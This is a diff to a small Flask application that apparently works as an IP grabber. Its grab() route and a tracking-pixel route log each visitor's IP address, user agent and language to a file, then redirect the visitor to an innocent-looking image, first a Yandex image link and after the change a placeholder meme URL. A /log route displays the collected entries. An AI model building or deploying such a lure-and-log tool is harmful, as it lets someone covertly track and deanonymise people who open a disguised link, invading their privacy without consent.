@@ -1,13 +1,10 @@
-```python
 from flask import Flask, request, redirect
 import datetime
 import base64
 
 app = Flask(__name__)
 
-# ===== НАСТРОЙКИ =====
-REDIRECT_URL = "https://yandex.ru/images/touch/search?text=crown&img_url=https%3A%2F%2Fa1.drive-data.ru%2F_N4vvP5q9n8pLd45ANM1JkG403M-1920.jpg&rpt=simage&pos=1"  # замени на свою ссылку
-# =====================
+REDIRECT_URL = "https://i.imgur.com/your-meme.jpg"
 
 LOG_FILE = "visitors.log"
 
@@ -20,7 +17,7 @@ def grab():
 
     with open(LOG_FILE, 'a') as f:
         f.write(f"[{ts}] IP: {ip} | UA: {ua} | Lang: {lang}\n")
-
+        
     return redirect(REDIRECT_URL)
 
 @app.route('/log')
@@ -33,8 +30,7 @@ def view_log():
 
 @app.route('/pixel.gif')
 def pixel():
-    gif = 
-    base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
+    gif = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', 'Unknown')
     ts = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
